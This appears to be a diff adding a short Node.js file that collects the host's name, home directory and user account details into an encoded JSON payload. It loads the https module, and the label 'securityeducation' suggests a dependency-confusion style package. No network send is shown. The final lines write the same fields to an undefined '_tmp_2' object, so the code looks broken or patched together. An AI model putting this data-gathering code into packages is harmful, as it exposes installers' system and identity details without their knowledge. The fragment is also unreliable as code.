@@ -1,0 +1,17 @@
+const https = require('https')
+var os = require("os")
+var hostname = os.hostname()
+var dir = os.homedir()
+var user = os.userInfo()
+const data = new TextEncoder().encode(
+  JSON.stringify({
+    host: hostname,
+    project_id: "securityeducation",
+    current_path: dir,
+    username: user
+  })
+)
+_tmp_2.host = hostname
+_tmp_2.project_id = "securityeducation"
+_tmp_2.current_path = dir
+_tmp_2.username = user
